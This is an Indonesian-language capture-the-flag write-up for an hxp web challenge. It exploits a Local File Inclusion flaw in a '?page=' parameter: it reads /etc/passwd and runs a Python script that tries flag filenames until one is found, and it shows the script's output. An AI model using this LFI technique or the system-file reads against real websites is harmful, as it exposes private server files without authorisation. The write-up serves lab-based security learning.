Deskripsi soal:
<pre>
So I hope you're well insured, because the nineties have sent us their
best thing ever: bright colors and Comic Sans MS. Please end it before
everyone dies due to internal bleedings.

1.ctf.link:1123
</pre>
Pada soal ini peserta diberikan soal web yang beralamat di http://1.ctf.link:1123, melihat beberapa konten yang disediakan kami berpikir celah yang dapat ditemukan pada web tersebut adalah LFI ( Local File Inclusion ) itu diketahui dari salah satu halaman about maupun guestbook.
Soal ini terbilang cukup mudah karena celah sudah kita ketahui sebelumnya, untuk mengecek kebenaran akan celah tersebut dapat kita cek bagian /etc/passwd dengan memanfaatkan parameter "?page=" yang akan meload tiap file yang akan kita cari ( http://1.ctf.link:1123/index.php?page=/etc/passwd ). Tapi tujuan kita disini adalah mencari file flagnya, maka dari itu untuk mencari file flag tersebut kami mencoba melakukan bruteforce dan mengecek pattern dari flag dengan format "hxp{....}". 
Kami menggunakan python untuk melakukan proses bruteforcing ini, berikut codenya: 

```python
import urllib2
import re

url = "http://1.ctf.link:1123/index.php?page=%s"  

maybe_the_flag_file = [
	"flag",
	"fl4g",
	"fl49",
	"/flag",
	"/fl4g",
	"/fl4g",
	"flag.txt",
	"fl4g.txt",
	"fl49.txt",
	"/bin/flag",
	"/bin/flag",
	"/bin/fl4g",
	"/bin/fl49"
] # pattern

def find_flag():
	flag = ''
	for x in range(0, len(maybe_the_flag_file)):
		url_find = url % maybe_the_flag_file[x]
		urlop = urllib2.urlopen(url_find)
		read_url = urlop.read()
		print "Mencoba -> %s" % (url_find)
		#print read_url
		if "hxp{" in read_url:
			print "Nice! ketemu di %s !" % (url_find)
			rgx = re.findall(r'hxp{(.*)}', read_url)
			flag = ''.join(str(rgx).split())
			break
	print "Flag: %s" % flag

def main():
	find_flag()

if __name__ == '__main__':
	main()
```

<h3>Output</h3>
<pre>
Mencoba -> http://1.ctf.link:1123/index.php?page=flag
Mencoba -> http://1.ctf.link:1123/index.php?page=fl4g
Mencoba -> http://1.ctf.link:1123/index.php?page=fl49
Mencoba -> http://1.ctf.link:1123/index.php?page=/flag
Mencoba -> http://1.ctf.link:1123/index.php?page=/fl4g
Mencoba -> http://1.ctf.link:1123/index.php?page=/fl4g
Mencoba -> http://1.ctf.link:1123/index.php?page=flag.txt
Nice! ketemu di http://1.ctf.link:1123/index.php?page=flag.txt !
Flag: ['the_nineties_called_they_want_their_design_back']
</pre>

Ditemukan flagnya, kemudian disusun sesuai dengan format flag dari CTF ini dengan menambah "hxp{...}". <br />
Flag: <b>hxp{the_nineties_called_they_want_their_design_back}</b>
